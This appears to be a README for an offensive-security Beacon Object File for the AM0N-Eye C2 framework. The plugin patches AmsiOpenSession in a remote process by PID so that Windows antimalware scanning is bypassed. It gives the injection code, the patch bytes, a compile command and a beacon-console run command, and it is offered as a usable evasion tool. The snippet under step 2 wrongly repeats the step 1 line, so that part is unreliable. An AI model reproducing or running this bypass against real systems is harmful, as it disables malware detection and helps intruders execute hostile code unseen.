## AM0N-Eye BOF - Inject AMSI Bypass
AM0N-Eye Beacon Object File (BOF) that bypasses AMSI in a remote process with code injection.

### What does this do?
##### 1. Use supplied PID argument to get a handle on the remote process
```c
hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
```
##### 2. Load AMSI.DLL into beacons memory and get the address of AMSI.AmsiOpenSession
```c
hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
```
+ Both beacon and the target process will both have the same address for the symbol.
+ If AMSI.DLL does not exist in the remote process, running this may crash the target process.
##### 3. Write the AMSI bypass to the remote processes memory
```c
unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
BOOL success = KERNEL32$WriteProcessMemory(hProc, amsiOpenSessAddr, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
```

### Method = AMSI.AmsiOpenSession
+ Uses the AMSI bypass technique taught in Offensive Security's PEN-300/OSEP (Evasion Techniques and Breaching Defenses) course.
  - https://www.offensive-security.com/pen300-osep/


### Compile with x64 MinGW:
```bash
x86_64-w64-mingw32-gcc -c amsi-inject.c -o amsi-inject.o
```
### Run from AM0N-Eye Beacon Console
```bash
beacon> amsi-inject <PID>
```

### To Do List
+ Check that AMSI.DLL exists in remote process before injection
+ Add other AMSI bypasses to inject
+ Support x86


